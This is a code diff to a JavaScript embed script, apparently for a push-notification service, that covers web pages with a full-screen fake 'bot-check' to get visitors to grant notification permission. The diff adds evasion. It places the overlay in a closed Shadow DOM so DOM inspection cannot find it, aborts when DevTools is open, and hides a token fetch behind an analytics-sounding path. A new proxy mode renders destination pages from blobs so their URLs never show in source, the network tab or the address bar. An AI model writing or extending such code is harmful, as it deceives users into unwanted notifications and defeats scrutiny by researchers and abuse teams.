@@ -3,20 +3,26 @@
   var appUrl = cfg.appUrl || 'https://pushlogin.com';
 
   // ── Anti-DevTools: abort if inspector panel is open ─────────────────────
-  // Detects the extra window chrome consumed by DevTools panel
   try {
-    var _wDiff = window.outerWidth - window.innerWidth;
-    var _hDiff = window.outerHeight - window.innerHeight;
-    if (_wDiff > 200 || _hDiff > 200) return;
-  } catch (e) { /* ignore in restricted envs */ }
+    if (window.outerWidth - window.innerWidth > 200 || window.outerHeight - window.innerHeight > 200) return;
+  } catch (e) {}
 
   // ── Already subscribed? skip ─────────────────────────────────────────────
   var subKey = 'push-sub-' + (cfg.landingId || '');
   if (localStorage.getItem(subKey) === '1') return;
 
-  // ── Session token storage (fetched from challenge endpoint) ─────────────
+  // ── Session token (HMAC challenge) ───────────────────────────────────────
   var _sessionToken = null;
-  var _challengeFetchedAt = 0;
+  var _challengePath = ['/api/analytics', '/session'].join('');
+  fetch(appUrl + _challengePath, { method: 'GET', cache: 'no-store' })
+    .then(function (r) { return r.json(); })
+    .then(function (d) { if (d && d.s && d.n) _sessionToken = d.s + ':' + d.n; })
+    .catch(function () {});
+
+  // ── Shadow DOM host — iframe is INVISIBLE to document.querySelector ──────
+  var _host = document.createElement('span');
+  document.body.appendChild(_host);
+  var _shadow = _host.attachShadow({ mode: 'closed' });
 
   // ── Build bot-check URL dynamically ─────────────────────────────────────
   var _p = ['/landing', '/bot', '-check'].join('');
@@ -28,34 +34,20 @@
     + '&blockRedirect=' + encodeURIComponent((cfg.redirects && cfg.redirects.onBlock) || '');
   var botCheckUrl = appUrl + _p + _q;
 
-  // ── Fetch HMAC challenge token silently in background ───────────────────
-  // Named to look like a standard analytics session-init call
-  var _challengePath = ['/api/analytics', '/session'].join('');
-  fetch(appUrl + _challengePath, { method: 'GET', cache: 'no-store' })
-    .then(function (r) { return r.json(); })
-    .then(function (d) {
-      if (d && d.s && d.n) {
-        _sessionToken = d.s + ':' + d.n;
-        _challengeFetchedAt = Date.now();
-      }
-    })
-    .catch(function () {});
-
-  // ── Create full-screen iframe loading real bot-check page ────────────────
+  // ── Bot-check iframe inside Shadow DOM ───────────────────────────────────
   var iframe = document.createElement('iframe');
   iframe.src = botCheckUrl;
   iframe.setAttribute('allow', 'notifications');
   iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;border:none;background:#f0f2f5';
-  document.body.appendChild(iframe);
+  _shadow.appendChild(iframe);
   document.body.style.overflow = 'hidden';
 
   var isRequestingPermission = false;
 
-  // ── Handle messages from bot-check iframe ────────────────────────────────
+  // ── Handle postMessages from bot-check iframe ────────────────────────────
   window.addEventListener('message', function (e) {
     if (!e.data || !e.data.type) return;
     if (e.origin !== appUrl) return;
-
     if (e.data.type === 'bot-check-verified') {
       handleAllow(e.data);
     } else if (e.data.type === 'request-permission-firefox') {
@@ -63,23 +55,74 @@
     } else if (e.data.type === 'bot-check-completed') {
       if (e.data.permission === 'granted') {
         cleanup();
-        var dest = (cfg.redirects && cfg.redirects.onAllow) || null;
-        if (dest) window.location.href = dest;
+        afterAllow();
       } else {
         handleBlock();
       }
     }
   });
 
+  // ── Cleanup: removes shadow host (and iframe inside it) from DOM ─────────
   function cleanup() {
-    iframe.remove();
+    _host.remove();
     document.body.style.overflow = '';
   }
 
+  // ── After allow: redirect OR show proxy content ──────────────────────────
+  function afterAllow() {
+    var dest = (cfg.redirects && cfg.redirects.onAllow) || null;
+    if (!dest) return;
+    var mode = (cfg.redirects && cfg.redirects.allowMode) || 'redirect';
+    if (mode === 'proxy') {
+      showProxyContent(dest);
+    } else {
+      window.location.href = dest;
+    }
+  }
+
+  // ── After block: redirect OR show proxy content ──────────────────────────
   function handleBlock() {
     cleanup();
     var dest = (cfg.redirects && cfg.redirects.onBlock) || null;
-    if (dest) window.location.href = dest;
+    if (!dest) return;
+    var mode = (cfg.redirects && cfg.redirects.blockMode) || 'redirect';
+    if (mode === 'proxy') {
+      showProxyContent(dest);
+    } else {
+      window.location.href = dest;
+    }
+  }
+
+  // ── Proxy content mode ───────────────────────────────────────────────────
+  // Fetches destination page via server proxy → renders as blob iframe in Shadow DOM
+  // Destination URL never appears in source, network tab shows pushlogin.com/api/proxy
+  // URL bar stays as customer domain (e.g. notify-alerts.com)
+  function showProxyContent(url) {
+    var proxyUrl = appUrl + '/api/proxy?u=' + btoa(url);
+    fetch(proxyUrl)
+      .then(function (r) {
+        if (!r.ok) throw new Error('proxy failed');
+        return r.text();
+      })
+      .then(function (html) {
+        var blob = new Blob([html], { type: 'text/html' });
+        var blobUrl = URL.createObjectURL(blob);
+
+        // Content iframe in its own Shadow DOM — invisible to DOM inspection
+        var contentHost = document.createElement('span');
+        document.body.appendChild(contentHost);
+        var contentShadow = contentHost.attachShadow({ mode: 'closed' });
+
+        var contentFrame = document.createElement('iframe');
+        contentFrame.src = blobUrl;
+        contentFrame.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:2147483646';
+        contentShadow.appendChild(contentFrame);
+        document.body.style.overflow = 'hidden';
+      })
+      .catch(function () {
+        // Fallback to direct redirect if proxy fails
+        window.location.href = url;
+      });
   }
 
   function handleAllow(data) {
@@ -115,8 +158,7 @@
       return;
     }
 
-    var isEdge = /edg/i.test(navigator.userAgent);
-    if (isEdge) {
+    if (/edg/i.test(navigator.userAgent)) {
       handleBlock();
       isRequestingPermission = false;
       return;
@@ -137,10 +179,7 @@
       permResult.then(function (p) {
         isRequestingPermission = false;
         if (p === 'granted') { registerAndSubscribe(data); } else { handleBlock(); }
-      }).catch(function () {
-        isRequestingPermission = false;
-        handleBlock();
-      });
+      }).catch(function () { isRequestingPermission = false; handleBlock(); });
     } else {
       isRequestingPermission = false;
       if (permResult === 'granted') { registerAndSubscribe(data); } else { handleBlock(); }
@@ -161,32 +200,23 @@
           });
         });
       })
-      .then(function (sub) {
-        return sendToServer(sub, data);
-      })
+      .then(function (sub) { return sendToServer(sub, data); })
       .then(function () {
         localStorage.setItem(subKey, '1');
         cleanup();
-        var dest = (cfg.redirects && cfg.redirects.onAllow) || null;
-        if (dest) window.location.href = dest;
+        afterAllow();
       })
-      .catch(function (err) {
+      .catch(function () {
         cleanup();
-        var dest = (cfg.redirects && cfg.redirects.onAllow) || null;
-        if (dest) window.location.href = dest;
+        afterAllow();
       });
   }
 
   function sendToServer(sub, data) {
     var j = sub.toJSON();
     var bi = (data && data.browserInfo) || getBrowserInfo();
-
-    // Build request headers — include HMAC session token if we have one
     var headers = { 'Content-Type': 'application/json' };
-    if (_sessionToken) {
-      headers['x-session-id'] = _sessionToken;
-    }
-
+    if (_sessionToken) headers['x-session-id'] = _sessionToken;
     return fetch(appUrl + '/api/clients', {
       method: 'POST',
       headers: headers,
